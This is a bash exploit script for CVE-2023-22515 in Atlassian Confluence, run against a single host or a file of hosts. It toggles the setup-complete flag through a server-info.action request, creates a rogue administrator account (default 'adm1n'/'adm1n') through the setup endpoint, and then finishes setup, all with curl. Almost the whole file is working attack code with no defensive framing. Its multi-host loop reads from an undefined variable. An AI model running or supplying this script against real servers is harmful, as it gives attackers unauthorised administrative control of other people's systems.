#!/usr/bin/env bash

TARGET=$1
LOGIN=$2
PASSWD=$3

# Checking if we have a target to attack
if [ -z "$TARGET" ];then
	TARGET="-h"
fi

# Small standart how-to.
if [ -z "$TARGET" ] || [ "$TARGET" == "-h" ];then
	echo "----------------Welcome-to-cve-2023-22515-script-by-1veresk------------+";
	echo "+----------------------------------------------------------------------+";
	echo "+-------------------For-The-Help---------------------------------------+";
	echo "Example#1: ./cve-2023-22515.sh -h--------------------------------------+";
	echo "+-------------------For-The-URL-Check----------------------------------+";
	echo "Example#1: ./cve-2023-22515.sh <TARGET_IP> <LOGIN> <PASSWORD>----------+";
	echo "+-------------------For-The-File-Check---------------------------------+";
	echo "Example#1: ./cve-2023-22515.sh <TARGET_IP> <LOGIN> <PASSWORD>----------+";
	echo "+---The Deafault <LOGIN>=adm1n <PASSWORD>=adm1n------------------------+";
	echo "+----------------------------------------------------------------------+";
	exit 1;
fi

# If LOGIN is empty setting it as 'adm1n'
if [ -z "$LOGIN" ]; then 
	LOGIN="adm1n";
fi

# If PASSWD is empty setting it up as 'adm1n'
if [ -z "$PASSWD" ]; then
	PASSWD="adm1n"
fi
# Attacking Target
if [ -e "$TARGET" ];then
	while read LINE; do
		echo "attacking the HOST $LINE"
		echo "switching the Application Config state to False"
		curl -vk http://$LINE/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
		sleep 1
		echo "creating a new Admin user"
		curl -vk -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=$LOGIN&fullName=$LOGIN&email=haxor%40localhost&password=$PASSWD&confirm=$PASSWD&setup-next-button=Next" http://$LINE/setup/setupadministrator.action
		sleep 1
		echo "returning the Application Config state"
		curl -vk -X POST -H "X-Atlassian-Token: no-check" http://$LINE/setup/finishsetup.action
		sleep 1
	done <$IP
else
	echo "+---attacking the HOST $TARGET------------------------+"
	echo "+---switching the Application Config state to False---+"
	curl -vk http://$TARGET/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
	sleep 1
	echo "+---creating a new Admin user-------------------------+"
	curl -vk -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=$LOGIN&fullName=$LOGIN&email=haxor%40localhost&password=$PASSWD&confirm=$PASSWD&setup-next-button=Next" http://$TARGET/setup/setupadministrator.action
	sleep 1
	echo "+---returning the Application Config state------------+"
	curl -vk -X POST -H "X-Atlassian-Token: no-check" http://$TARGET/setup/finishsetup.action
	sleep 1
fi